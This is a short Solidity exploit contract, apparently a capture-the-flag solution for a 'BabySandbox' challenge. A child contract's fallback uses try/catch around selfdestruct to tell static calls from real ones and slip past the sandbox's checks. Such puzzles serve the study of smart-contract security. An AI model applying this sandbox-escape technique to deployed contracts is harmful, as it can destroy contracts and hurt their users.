pragma solidity 0.7.0;

import "./SetupBabySandbox.sol";

contract Child {

    Child private immutable self = this;

    function check() external {
        selfdestruct(msg.sender); 
    }    

    fallback() external { 
       try self.check() {
            selfdestruct(msg.sender); 
        } 
        catch {}
    }
}

contract ExploitBabySandbox {

    address public child;
    constructor() {
        child = address(new Child());
    }

    function execute(SetupBabySandbox setup) external {
        setup.sandbox().run(child);
    }
}